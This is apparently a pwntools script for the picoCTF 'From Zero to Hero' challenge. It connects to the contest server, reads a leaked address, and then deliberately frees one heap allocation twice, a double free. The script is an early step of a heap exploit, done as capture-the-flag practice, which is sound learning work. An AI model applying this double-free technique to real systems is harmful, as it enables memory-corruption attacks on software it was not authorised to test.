#!/usr/bin/env python3

from pwn import *
import sys

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'debug' if '-d' in sys.argv else 'info'

p = remote(HOST, PORT)

# Initial dialog
p.sendlineafter(b'From Zero to Hero', b'y')
p.sendlineafter(b'Really?', b'y')

# Get leak
p.recvuntil(b'Take this: ')
leak = int(p.recvline().strip(), 16)
log.info(f"Leak: 0x{leak:x}")

# Get menu
menu = p.recvuntil(b'>')
log.info(f"Menu received: {menu[-50:]}")

# Try option 1
log.info("Sending option 1")
p.sendline(b'1')

# See what happens
try:
    response = p.recvuntil(b'length', timeout=2)
    log.info(f"Got response asking for length")
    
    # Send a valid size
    p.sendline(b'100')
    
    response = p.recvuntil(b'description', timeout=2)
    log.info(f"Got response asking for description")
    
    # Send description
    p.sendline(b'AAAA')
    
    response = p.recvuntil(b'>', timeout=2)
    log.info(f"Back at menu! Allocation successful")
    
    # Try option 2 to free
    p.sendline(b'2')
    response = p.recvuntil(b'remove', timeout=2)
    log.info(f"Asked which to remove")
    
    p.sendline(b'0')
    response = p.recvuntil(b'>', timeout=2)
    log.info(f"Free successful")
    
    # Try double free
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'0')  # Double free!
    
    log.info("Double free sent")
    
except Exception as e:
    log.error(f"Error: {e}")
    log.info("Connection likely closed")

p.close()